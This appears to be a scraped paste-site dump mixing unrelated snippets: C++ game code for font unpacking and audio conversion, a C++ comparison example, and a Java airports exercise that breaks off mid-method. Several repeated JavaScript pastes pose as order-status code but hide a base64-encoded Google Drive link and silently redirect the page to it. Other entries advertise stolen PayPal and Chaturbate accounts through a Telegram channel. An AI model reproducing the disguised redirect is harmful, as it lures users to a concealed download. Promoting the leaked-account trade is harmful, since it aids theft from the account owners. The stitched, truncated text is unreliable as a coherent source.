#include <public_stuff.hpp>
#ifdef FONT_PICO8_USED



// This is how pixels are stored. Each bit corresponds to
// one pixel of a given char. the pixels storage order is as follows:
//
// -----
// |CDE|
// |9AB|
// |678|
// |345|
// |012|
// -----
//
// For example, a char with the data of ""0b111100110000010"" would look like:
//
// ----- (A question mark)
// |###|
// |..#|
// |.##|
// |...|
// |.#.|
// -----
//
// Glyphs are 3x5 pixels each, first char is 32 (' '), 96 chars in total.
// This means that this font has data for chars 32-127, and nothing more
//
// (96-1 is used here, to make it so that if you have a font that takes up
//  all 256 chars, it will still fit into a byte (2^8-1 = 255, not 256).)
u8 font_pico8_packed[184] = { 3, 5, 32, 96-1, // 184B
  0b00000000, 0b00000000, 0b01000001, 0b00010010,
  0b10000000, 0b10110110, 0b11101111, 0b10101011,
  0b01111011, 0b01101111, 0b11000100, 0b10111110,
  0b11011011, 0b00000000, 0b01000100, 0b01001010,
  0b00100010, 0b10010001, 0b01010100, 0b01110101,
  0b00010101, 0b10111010, 0b00010000, 0b00000001,
  0b00000000, 0b00001110, 0b00000100, 0b00000000,
  0b00100010, 0b10001001, 0b01101111, 0b11111011,
  0b01001011, 0b11011010, 0b01110011, 0b11111110,
  0b00111100, 0b01001111, 0b10111110, 0b00111101,
  0b10011111, 0b10111111, 0b11001111, 0b01001001,
  0b11110010, 0b11101111, 0b01111011, 0b11110010,
  0b00111101, 0b00000100, 0b00100001, 0b10000010,
  0b01000000, 0b01000101, 0b11000100, 0b01110001,
  0b01000100, 0b01010100, 0b00000100, 0b11110011,
  0b01001110, 0b10101011, 0b11110110, 0b11111101,
  0b10111011, 0b11011110, 0b01001001, 0b11111100,
  0b10110110, 0b01111011, 0b10010110, 0b00100111,
  0b11001011, 0b11011111, 0b11000100, 0b11101101,
  0b11011011, 0b01001011, 0b11111010, 0b00100100,
  0b10111101, 0b01011101, 0b11111011, 0b00100100,
  0b01101001, 0b11111011, 0b10110111, 0b11101101,
  0b11010110, 0b11010110, 0b11001001, 0b01111011,
  0b10101111, 0b01010101, 0b10111011, 0b01111110,
  0b01111100, 0b00101100, 0b01001001, 0b01110111,
  0b11011011, 0b11101010, 0b01101101, 0b11111111,
  0b10110110, 0b10101101, 0b11011010, 0b11110011,
  0b11101101, 0b00100011, 0b01111110, 0b01001001,
  0b01000110, 0b01001001, 0b00110001, 0b01001001,
  0b00000011, 0b10101000, 0b00001110, 0b00000000,
  0b00000000, 0b10010100, 0b10111110, 0b11000111,
  0b10111011, 0b11100001, 0b11001001, 0b10110001,
  0b01110110, 0b01111000, 0b01110110, 0b00100100,
  0b00111011, 0b11011110, 0b00011100, 0b01111101,
  0b10001011, 0b01001011, 0b11000111, 0b10100100,
  0b10100011, 0b01011101, 0b11110001, 0b00100100,
  0b01101000, 0b01111111, 0b10110100, 0b00011101,
  0b11010110, 0b00011010, 0b01111001, 0b00001111,
  0b10101111, 0b01000010, 0b11010111, 0b01100011,
  0b10001100, 0b00100001, 0b11101001, 0b01110000,
  0b01011011, 0b11101000, 0b00101101, 0b11111110,
  0b00010110, 0b10101101, 0b10001010, 0b11110011,
  0b11000101, 0b11000011, 0b11000011, 0b10011010,
  0b00101100, 0b01001001, 0b10011010, 0b10101100,
  0b00100001, 0b00100111, 0b01011110, 0b00000001,
};

// This is where it unpacks to. It has the same ordering of pixels,
// except instead of 1 bit per pixel, it's 1 byte.
//
// For example, every 15 bytes is the next char, so to find the address of
// a given char, you'd basically do:
// ""&font_pico8[15 * char_value]""
// OR
// (font_pico8 + (15 * char_value))
//
// The first 4 bytes are: char_width, char_height, transparency, (reserved)
Color8 font_pico8[4 + 3*5 * 256]; // 3844B





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\draw\unpack_font.cpp"":
#include <public_stuff.hpp>
#ifdef UNPACK_FONT_USED



bool unpack_font(Color8* dst, const u8* src,
                 Color8 fontColor,
                 Color8 transparencyColor)
{
  if(!dst || !src) return false;

  u32 w        = dst[0].v = src[0];
  u32 h        = dst[1].v = src[1];
  u32 first               = src[2];
  u32 numchars            = src[3];

  dst[2]   = transparencyColor;
  dst[3].v = 0; // (Reserved)

  // Initialize all pixels to the transparent color
  memSet(&dst[4].v, transparencyColor.v, w*h*256);



  // Due to the fact the value in src is only a single byte wide,
  // this value must be incremented to get the real value, since if
  // the font has all 256 chars, only 255 of them can be written otherwise.
  ++numchars;

  u32 size = w*h;

  dst += 4 + size*first; // Seek to first pixel of unpacked font data
  src += 4;              // Seek to start of packed font data



  u32 i = 0;

  for(u32 c=0; c<numchars; ++c)
  for(u32 p=0; p<    size; ++p)
  {
    dst[i] = (is_bit_set(src, i)) ? fontColor : transparencyColor;
    ++i;
  }



  return true;

}





#endif
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\misc\is_bit_set.cpp"":
#include <public_stuff.hpp>



bool is_bit_set(const void* buffer, u32 which_bit){
  union {
    u32 value;
    struct {
      u32 bit  :  3;
      u32 byte : 29;
    };
  } _which_bit;

  _which_bit.value = which_bit;

  return 1&(  (((u8*)buffer)[_which_bit.byte])  >>  _which_bit.bit  );

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\misc\kit_misc.cpp"":
#include <public_stuff.hpp>



#ifdef FRAND_USED
#include <stdlib.h>



#if RAND_MAX == 32767
  #define GET_FRAND_VALUE(cast) ( (cast)(rand()<<15|rand())/0x3FFFFFFF )

#elif RAND_MAX == 2147483647
  #define GET_FRAND_VALUE(cast) ( (cast)rand()/0x7FFFFFFF )

#else
  #error ""no definition of GET_FRAND_VALUE() available for current RAND_MAX""

#endif



f64 frand(){ //0.0f -> 1.0f
  return GET_FRAND_VALUE(f64);
}

f64 frand2(){ //-1.0f -> 1.0f
  return GET_FRAND_VALUE(f64)*2.0f - 1.0f;
}

f32 frandf(){ //0.0f -> 1.0f
  return GET_FRAND_VALUE(f32);
}

f32 frandf2(){ //-1.0f -> 1.0f
  return GET_FRAND_VALUE(f32)*2.0f - 1.0f;
}

#endif



//...
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\misc\print_event.cpp"":
#include <public_stuff.hpp>
#ifdef PRINT_EVENT_USED
#ifdef _DEBUG



static char key_evt_text[][5] = { // EVENT_KEY_?
  ""NULL"",
  ""CHAR"",
  ""UP"",
  ""DOWN"",
};

static char mouse_evt_text[][7] = { // EVENT_MOUSE_?
  ""NULL"",
  ""MOVED"",
  ""HWHEEL"",
  ""VWHEEL"",
  ""UP"",
  ""DOWN"",
};

static char cursor_evt_text[][9] = { // EVENT_CURSOR_?
  ""NULL"",
  ""TRAPPED"",
  ""RELEASED"",
};





void print_event(Event& evt){
  u16 subevent = SUBEVENT_ID(evt.type);



  switch(EVENT_ID(evt.type)){
    case EVENT_NULL:
    {
      _printf(""EVENT_NULL = {\n"");
      _printf(""  .type      = EVENT_NULL,\n"");
      _printf(""  .timestamp = %llu,\n"", evt.common.timestamp);
    } break;



    case EVENT_COMMON:
    {
      _printf(""EVENT_COMMON = {\n"");
      _printf(""  .type      = EVENT_COMMON,\n"");
      _printf(""  .timestamp = %llu,\n"", evt.common.timestamp);
    } break;



    case EVENT_QUIT:
    {
      _printf(""EVENT_COMMON = {\n"");
      _printf(""  .type      = EVENT_COMMON,\n"");
      _printf(""  .timestamp = %llu,\n"", evt.common.timestamp);
    } break;



    case EVENT_KEY:
    {
      _printf(""EVENT_KEY = {\n"");
      _printf(""  .type      = EVENT_KEY_%s,\n"", key_evt_text[subevent]);
      _printf(""  .timestamp = %llu,\n\n"", evt.key.timestamp);
      _printf(""  .kmods     = 0x%04X = {\n"", evt.key.kmods);
      _printf(""    .lshift    = %i,\n"", evt.key.sym.kmod.lshift);
      _printf(""    .rshift    = %i,\n"", evt.key.sym.kmod.rshift);
      _printf(""    .lctrl     = %i,\n"", evt.key.sym.kmod.lctrl);
      _printf(""    .rctrl     = %i,\n"", evt.key.sym.kmod.rctrl);
      _printf(""    .lalt      = %i,\n"", evt.key.sym.kmod.lalt);
      _printf(""    .ralt      = %i,\n"", evt.key.sym.kmod.ralt);
      _printf(""    .lgui      = %i,\n"", evt.key.sym.kmod.lgui);
      _printf(""    .rgui      = %i,\n"", evt.key.sym.kmod.rgui);
      _printf(""    .numlock   = %i,\n"", evt.key.sym.kmod.numlock);
      _printf(""    .capslock  = %i,\n"", evt.key.sym.kmod.capslock);
      _printf(""    .altgraph  = %i,\n"", evt.key.sym.kmod.altgraph);
      _printf(""    .scrollock = %i,\n"", evt.key.sym.kmod.scrollock);
      _printf(""  }\n\n"");
      _printf(""  .pkey    = 0x%02X,\n"", evt.key.pkey);
      _printf(""  .vkey    = 0x%02X,\n"", evt.key.vkey);
      _printf(""  .pressed = %s,\n"", BOOL_STR(evt.key.pressed));
      _printf(""  .ischar  = %s,\n"", BOOL_STR(evt.key.ischar));
      _printf(""  .repeat  = %s,\n"", BOOL_STR(evt.key.repeat));
    } break;



    case EVENT_MOUSE:
    {
      _printf(""EVENT_MOUSE = {\n"");
      _printf(""  .type      = EVENT_MOUSE_%s,\n\n"", mouse_evt_text[subevent]);
      _printf(""  .button    = 0x%02X,\n"", evt.mouse.button);
      _printf(""  .pressed   = %s,\n"", BOOL_STR(evt.mouse.pressed));
      _printf(""  .dblClick  = %s,\n\n"", BOOL_STR(evt.mouse.dblClick));
      _printf(""  .timestamp = %llu,\n\n"", evt.mouse.timestamp);
      _printf(""  .x         = %5.2f,\n"", evt.mouse.x);
      _printf(""  .y         = %5.2f,\n"", evt.mouse.y);
      _printf(""  .dx        = %5.2f,\n"", evt.mouse.dx);
      _printf(""  .dy        = %5.2f,\n"", evt.mouse.dy);
    } break;



    case EVENT_CURSOR:
    {
      _printf(""EVENT_CURSOR = {\n"");
      _printf(""  .type      = EVENT_CURSOR_%s,\n"", cursor_evt_text[subevent]);
      _printf(""  .timestamp = %llu,\n"", evt.common.timestamp);
    } break;



    default:
    {
      _printf(""EVENT_UNKNOWN = {\n"");
      _printf(""  .type      = 0x%08X,\n"", evt.type);
      _printf(""  .timestamp = %llu,\n"", evt.common.timestamp);
    }



  }



  _printf(""}\n"");

}





#endif /* _DEBUG */
#endif /* PRINT_EVENT_USED */
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\misc\snPrintf.cpp"":
#include <public_stuff.hpp>

#undef snprintf
#undef vsnprintf

#define STB_SPRINTF_IMPLEMENTATION
#include ""../../../dep/stb_sprintf.h""





s32 snPrintf(char* str_dst, size_t len_max, const char* str_fmt, ...){
  va_list va;
  va_start(va, str_fmt);

  s32 result = 0;

  if(len_max > 0  &&  len_max <= INT_MAX){
    result = stbsp_vsnprintf(str_dst, (int)len_max, str_fmt, va);
  } else {
    result = stbsp_vsprintf(str_dst, str_fmt, va);
  }

  va_end(va);

  return result;

}



s32 vsnPrintf(char* str_dst, size_t len_max, const char* str_fmt, va_list va){
  if(len_max > 0  &&  len_max <= INT_MAX){
    return stbsp_vsnprintf(str_dst, (int)len_max, str_fmt, va);

  } else {
    return stbsp_vsprintf(str_dst, str_fmt, va);

  }

}
/******************************************************************************/
/******************************************************************************/
//""gdi_maze_game_2025-04-25\src\kit_utils\sound\AudioData.cpp"":
#include <public_stuff.hpp>

#ifdef SOUND_STUFF_USED





void AudioDataHeader::printHeader(const char* name){
  if(name != nullptr){ _printf(""%s = {\n"", name); }
  else               { _printf(""%p = {\n"", this); }
#ifdef _DEBUG
  _printf(""  ->magic         = \""%.4s\""; (0x%08X)\n"", (char*)&magic, magic);


  const char* fmt_txt = ""?"";
  switch(format){
    case SMPFMT_U8    : fmt_txt = ""U8"";     break;
    case SMPFMT_S8    : fmt_txt = ""S8"";     break;

    case SMPFMT_U16LSB: fmt_txt = ""U16LSB""; break;
    case SMPFMT_S16LSB: fmt_txt = ""S16LSB""; break;
    case SMPFMT_S24LSB: fmt_txt = ""S24LSB""; break;
    case SMPFMT_S32LSB: fmt_txt = ""S32LSB""; break;
    case SMPFMT_F32LSB: fmt_txt = ""F32LSB""; break;
    case SMPFMT_F64LSB: fmt_txt = ""F64LSB""; break;

    case SMPFMT_U16MSB: fmt_txt = ""U16MSB""; break;
    case SMPFMT_S16MSB: fmt_txt = ""S16MSB""; break;
    case SMPFMT_S24MSB: fmt_txt = ""S24MSB""; break;
    case SMPFMT_S32MSB: fmt_txt = ""S32MSB""; break;
    case SMPFMT_F32MSB: fmt_txt = ""F32MSB""; break;
    case SMPFMT_F64MSB: fmt_txt = ""F64MSB""; break;

    default           : fmt_txt = ""UNKNOWN"";
  }

  _printf(""  ->format        = SMPFMT_%s; (0x%04X)\n"", fmt_txt, format);


  _printf(""  ->headerSize    = %u;\n"", headerSize);
  _printf(""  ->dataSize      = %llu;\n"", dataSize);
  _printf(""  ->loopStart     = %llu;\n"", loopStart);
  _printf(""  ->loopEnd       = %llu;\n"", loopEnd);
  _printf(""  ->numSamples    = %llu;\n"", numSamples);
  _printf(""  ->sampleRate    = %u;\n"", sampleRate);
  _printf(""  ->bitRate       = %u;\n"", bitRate);
  _printf(""  ->loopCount     = %u;\n"", loopCount);
  _printf(""  ->channels      = %u;\n"", channels);
  _printf(""  ->_reserved     = %u;\n"", _reserved);
  _printf(""  ->fmt_version   = %u;\n"", fmt_version);
  _printf(""  ->mode          = %u;\n"", mode);
  _printf(""  ->metadata_type = %u;\n"", metadata_type);
  _printf(""  ->samples       = %p;\n"", samples);
  _printf(""  ->userdata      = %p;\n"", userdata);
  _printf(""};"");


#else
  _printf(""  (AudioDataHeader::printHeader() is not available in release build!)\n}\n"");


#endif /* _DEBUG */
}





bool AudioData::_allocate_hdr(u16 headerSize, u64 dataSize){
  if(hdr) return false;

  if(headerSize < sizeof(AudioDataHeader)) return false;

  hdr = (AudioDataHeader*)mem_alloc(headerSize+dataSize);

  if(hdr == nullptr) return false;

  mem_set(hdr, 0, headerSize+dataSize);


  hdr->magic      = KPM_FILE_SIG;

  hdr->headerSize = headerSize;
  hdr->dataSize   = dataSize;

  hdr->samples    = (u8*)hdr + hdr->headerSize;


  return true;

}





AudioData::AudioData(AudioSampleFormatEnum format,
                     u64 numSamples, u16 channels, u32 sampleRate)
{
  if(hdr) return;

  const u64 dataSize = GET_AUDIO_BYTESIZE(format)*numSamples*channels;

  if(!_allocate_hdr(sizeof(AudioDataHeader), dataSize)) return;

  // (Redundant assignments are commented out here)

//hdr->magic         = KPM_FILE_SIG;
  hdr->format        = format;
//hdr->headerSize    = sizeof(AudioDataHeader);
//hdr->dataSize      = dataSize;

//hdr->loopStart     = 0;
  hdr->loopEnd       = numSamples;

  hdr->numSamples    = numSamples;
  hdr->sampleRate    = sampleRate;
  hdr->bitRate       = GET_AUDIO_BITSIZE(format)*sampleRate*channels;

//hdr->loopCount     = 0;
  hdr->channels      = channels;
//hdr->_reserved     = 0;
  hdr->fmt_version   = 1; // 1 indicates the version kit_sdl2 uses
//hdr->mode          = 0; // PCM or float data
//hdr->metadata_type = 0; // No metadata

//hdr->samples       = (u8*)hdr + hdr->headerSize;
//hdr->userdata      = nullptr;

}





#ifdef AUDIODATA_FILELOAD_USED

#define KPCM_FILE_SIG 0x4D43506B //.kpm's old file signature

AudioData::AudioData(const char* filePath,
                     AudioDataLoaderCallback callback)
{
  if(hdr) return;

  if(filePath == nullptr) return;

  if(!fileio_exists(filePath)) return;



  AudioDataHeader* _hdr;

  if(callback == nullptr){ // Load .kpm file
    size_t fileSize;
    _hdr = (AudioDataHeader*)fileio_read(filePath, &fileSize);
    if(_hdr == nullptr) return;

    // Check for the current and old version of .kpm's file signature
    // (but only if the fileSize is enough for a u32)
    if(fileSize >= sizeof(u32)  &&
       (_hdr->magic != KPM_FILE_SIG  &&  _hdr->magic != KPCM_FILE_SIG))
    {
      _free_hdr_copy: mem_free(&_hdr); return;
    }
    else if(fileSize < sizeof(AudioDataHeader)) goto _free_hdr_copy;

/*
    if(_hdr->magic != KIT_MAGIC_KPM) throw ""magic != KIT_MAGIC_KPM"";

    if(!isFormatValid(_hdr->format)) throw ""format is invalid"";

    if(_hdr->headerSize < sizeof(AudioDataHeader)) throw ""headerSize < sizeof(AudioDataHeader)"";

    if(_hdr->dataSize != (fileSize-_hdr->headerSize)) throw ""dataSize is invalid"";

    //(channels are checked before numSamples to prevent divide-by-zero exceptions)
    if(_hdr->channels!=1 && _hdr->channels!=2) throw ""audio is neither mono nor stereo"";

    //(numSamples is checked before loopStart/loopEnd, as their checks rely upon numSamples)
    if(_hdr->numSamples != (_hdr->dataSize/KIT_ASTREAM_FMT_BYTESIZE(_hdr->format))/_hdr->channels) throw ""numSamples is invalid"";

    if(_hdr->loopStart >= _hdr->numSamples) throw ""loopStart >= numSamples"";

    if(_hdr->loopEnd > _hdr->numSamples) throw ""loopEnd > numSamples"";

    if(_hdr->sampleRate < 1000) throw ""sampleRate < 1000"";

    if(_hdr->bitRate != _hdr->sampleRate*_hdr->channels*KIT_ASTREAM_FMT_BITSIZE(_hdr->format)) throw ""bitRate is invalid"";

    if(_hdr->bitRemainder != 0) throw ""bitRemainder != 0"";

    if(_hdr->mode != 0) throw ""only mode 0 kPCM files are currently supported"";
*/

    // The only difference between 0 and 1 is that bitsPerSample is offset by -1
    if(_hdr->fmt_version == 0) ++_hdr->format;

    _hdr->magic       = KPM_FILE_SIG; // If it was previously kPCM, now it is kPxM
    _hdr->fmt_version = 1;


  } else {
    _hdr = callback(filePath);
    if(_hdr == nullptr) return;


  }



  size_t totalSize = _hdr->headerSize + _hdr->dataSize;
  hdr = (AudioDataHeader*)mem_alloc(totalSize);
  if(hdr == nullptr){ mem_free(&_hdr); return; }

  mem_copy(hdr, _hdr, totalSize);
  mem_free(&_hdr);

  hdr->samples = (u8*)hdr + hdr->headerSize;

}

#endif /* AUDIODATA_FILELOAD_USED */





AudioData::~AudioData(){
  mem_free(&hdr);
}





#ifdef AUDIODATA_SAVEAUDIO_USED

bool AudioData::saveAudio(const char* filePath,
                          AudioDataSaverCallback callback)
{
  if(hdr == nullptr) return false;
  if(filePath == nullptr) return false;

  if(callback == nullptr){ //save .kpm
    if(!fileio_write(filePath, hdr, hdr->headerSize+hdr->dataSize))
      return false;
  } else {
    if(!callback(filePath, *hdr))
      return false;
  }

  return true;

}

#endif





#ifdef AUDIODATA_CONVERTFORMAT_USED

static bool _fmt_is_valid(u16 fmt){
  switch(fmt){
    case SMPFMT_U8 :
    case SMPFMT_S8 :
    case SMPFMT_U16:
    case SMPFMT_S16:
    case SMPFMT_S24:
    case SMPFMT_S32:
    case SMPFMT_F32:
    case SMPFMT_F64: return  true; // Lol
    default:         return false;
  }
}

// = 2^(bits-1)
#define ABS_S8_MIN         (128) //ABS_Sx_MIN is a horrible name for this,
#define ABS_S16_MIN      (32768)  //but it's the name i chose within 10 seconds
#define ABS_S24_MIN    (8388608)  //(so i may or may not change it, idk)
#define ABS_S32_MIN (2147483648)

struct _s24 { u8 a, b, c; } //mostly for memory alignment purposes
ATTR_PACKED; //(explicitly pack just in case; probably unnecessary)

union _s24u {
  _s24 v;
   s32 n : 24;
  inline _s24u(_s24 _v) : v(_v) {}
  inline _s24u(s32  _n) : n(_n&0x7FFFFF) {}
};

static inline f64 frm_s24(_s24 x){ return (f64)_s24u(x).n/ABS_S24_MIN; }

static inline _s24 to_s24(f64 x){ return _s24u((s32)(x*0x7FFFFF)).v; }



bool AudioData::convertFormat(AudioSampleFormatEnum format){
  if(hdr == nullptr) return false;

  if(hdr->format == format) return true;

  if(!_fmt_is_valid(hdr->format)) return false;

  if(!_fmt_is_valid(format)) return false;



  u64 totalSamples = hdr->numSamples*hdr->channels;

  u64    dataSize = GET_AUDIO_BYTESIZE(format)*totalSamples;
  u32     bitRate = GET_AUDIO_BITSIZE(format)*hdr->sampleRate*hdr->channels;



  mem_Wrapper temp_samples(totalSamples*sizeof(f64));
  f64*  tmp = (f64*)temp_samples.ptr;
  void* smp = hdr->samples;

  #define FOR_TS_BRK(x) for(u64 i=0; i<totalSamples; ++i){ x; } break
  #define SMPCAST(_type) (  ((_type*)smp)[i]  )
  #define FRM_CONV(_type, _scaling_factor, _modifier) \
    (  ((f64)SMPCAST(_type) _modifier) _scaling_factor  )

  // Convert all source samples to 64-bit floats
  switch(hdr->format){
    case SMPFMT_U8 : FOR_TS_BRK(  tmp[i] = FRM_CONV(u8 , /ABS_S8_MIN ,   -128)  );
    case SMPFMT_S8 : FOR_TS_BRK(  tmp[i] = FRM_CONV(s8 , /ABS_S8_MIN ,       )  );
    case SMPFMT_U16: FOR_TS_BRK(  tmp[i] = FRM_CONV(u16, /ABS_S16_MIN, -32768)  );
    case SMPFMT_S16: FOR_TS_BRK(  tmp[i] = FRM_CONV(s16, /ABS_S16_MIN,       )  );
    case SMPFMT_S24: FOR_TS_BRK(  tmp[i] = frm_s24(SMPCAST(_s24))               );
    case SMPFMT_S32: FOR_TS_BRK(  tmp[i] = FRM_CONV(s32, /ABS_S32_MIN,       )  );
    case SMPFMT_F32: FOR_TS_BRK(  tmp[i] = FRM_CONV(f32,             ,       )  );
    case SMPFMT_F64: mem_copy(tmp, smp, hdr->dataSize); break;
  }



  //resize header to match destination format's dataSize
  if(!mem_realloc(&hdr, hdr->headerSize+dataSize)) return false;

  //update relevant header values
  hdr->format       = format;
  hdr->dataSize     = dataSize;
  hdr->bitRate      = bitRate;
  hdr->samples      = (u8*)hdr + hdr->headerSize;

  smp = hdr->samples;



  #define TO_CONV(_type, _scl_fct, _mod) (  (_type)( tmp[i] _scl_fct _mod )  )

  //convert the f64 samples to the desired format
  switch(hdr->format){ //(hdr->format = format now)
    case SMPFMT_U8 : FOR_TS_BRK(  SMPCAST( u8 ) = TO_CONV(u8 , *  127,   +128)  );
    case SMPFMT_S8 : FOR_TS_BRK(  SMPCAST( s8 ) = TO_CONV(s8 , *  127,       )  );
    case SMPFMT_U16: FOR_TS_BRK(  SMPCAST( u16) = TO_CONV(u16, *32767, +32768)  );
    case SMPFMT_S16: FOR_TS_BRK(  SMPCAST( s16) = TO_CONV(s16, *32767,       )  );
    case SMPFMT_S24: FOR_TS_BRK(  SMPCAST(_s24) = to_s24(tmp[i])                );
    case SMPFMT_S32: FOR_TS_BRK(  SMPCAST( s32) = TO_CONV(s32, *0x7FFFFFFF,  )  );
    case SMPFMT_F32: FOR_TS_BRK(  SMPCAST( f32) = TO_CONV(f32,            ,  )  );
    case SMPFMT_F64: mem_copy(smp, tmp, hdr->dataSize); break;
  }



  return true;

}

#endif





#endif
"
bSvmv33k,Products.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 04:51:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97948/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
21uUcG6W,PayPal with Balance,dentira,JavaScript,Friday 25th of April 2025 04:48:38 AM CDT,00496 Accounts Posted On https://t.me/leakedbyeminem
iahTwd0p,Order.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 04:35:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54508/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bdB8VkKd,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Friday 25th of April 2025 04:33:13 AM CDT,57693 Accounts Posted On https://t.me/leakedbyeminem
qLv5HeLy,Market.js,Xp_Isolation,JavaScript,Friday 25th of April 2025 04:20:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06478/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
T828rB7x,Chaturbate with Tokens,Epiphemeral,JavaScript,Friday 25th of April 2025 04:17:51 AM CDT,30928 Accounts Posted On https://t.me/leakedbyeminem
NVkaE9Yc,Untitled,Rivoryx,C++,Friday 25th of April 2025 04:17:43 AM CDT,"#include <compare>

//Forward declaration
template <class T>
class MyClass;

//Forward declaration
template <class T>
typename std::strong_ordering operator<=>(const MyClass<T>& lhs, const MyClass<T>& rhs);

template <class T>
class MyClass {
public:
	void Set(const T& val) {
		val_ = val;
	}
	template <class K>
	class MyInnerClass {
	public:
		void func(K arg1, T arg2);
	};
	// Specific template specialization
	friend std::strong_ordering operator<=><T>(const MyClass<T>& lhs, const MyClass<T>& rhs);
	friend bool operator==<T>(const MyClass<T>& lhs, const MyClass<T>& rhs);
private:
	int val_ = 0;
};

template <class T>
template <class K>
void MyClass<T>::MyInnerClass<K>::func(K arg1, T arg2) {

}

// Actual definition
template <class T>
typename std::strong_ordering operator<=>(const MyClass<T>& lhs, const MyClass<T>& rhs) {
	return lhs.val_ <=> rhs.val_;
}

template <class T>
bool operator==(const MyClass<T>& lhs, const MyClass<T>& rhs) {
	return lhs.val_ == rhs.val_;
}

#include <iostream>

template <class T>
auto ComparePrint(const T& obj1, const T& obj2) {
	if (obj1 < obj2) {
		std::cout << ""<"" << std::endl;
	}
	else if (obj1 == obj2) {
		std::cout << ""="" << std::endl;
	}
	else {
		std::cout << "">"" << std::endl;
	}
}

int main() {
	MyClass<int> obj1, obj2;
	obj1.Set(1);
	obj2.Set(2);
	ComparePrint(obj1, obj2);
	obj1.Set(2);
	ComparePrint(obj1, obj2);
	obj2.Set(3);
	ComparePrint(obj1, obj2);
}"
Q6a73PJw,[NP] Airports,dzocesrce,Java,Friday 25th of April 2025 04:14:27 AM CDT,"import java.util.*;
import java.time.LocalTime;
import java.util.Comparator;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicInteger;
class Airport {

    String name;
    String country;
    String code;
    int passengers;

    public Airport(String name, String country, String code, int passengers) {
        this.name = name;
        this.country = country;
        this.code = code;
        this.passengers = passengers;
    }

    public String getName() {
        return name;
    }

    public String getCountry() {
        return country;
    }

    public String getCode() {
        return code;
    }

    public int getPassengers() {
        return passengers;
    }

    @Override
    public String toString() {
        return ""Airport{"" +
                ""name='"" + name + '\'' +
                "", country='"" + country + '\'' +
                "", code='"" + code + '\'' +
                "", passengers="" + passengers +
                '}';
    }
}
class AirportGroup {

    Map<String,Airport> airports;
    Map<String,List<Flight>> flights;
    public AirportGroup() {
        airports= new HashMap<>();
        flights= new HashMap<>();
    }

    public void addAirport(String name, String country, String code, int passengers) {
        airports.putIfAbsent(code,new Airport(name,country,code,passengers));
        flights.putIfAbsent(code,new ArrayList<>());
    }

    public void addFlights(String from, String to, int time, int duration) {
        flights.get(from).add(new Flight(from,to,time,duration));

    }

    public void showFlightsFromAirport(String from) {
        AtomicInteger atomicInteger = new AtomicInteger(1);
        System.out.println(String.format(""%s (%s)\n%s\n%d"", airports.get(from).getName(),
                airports.get(from).getCode(),
                airports.get(from).getCountry(),
                airports.get(from).getPassengers()));
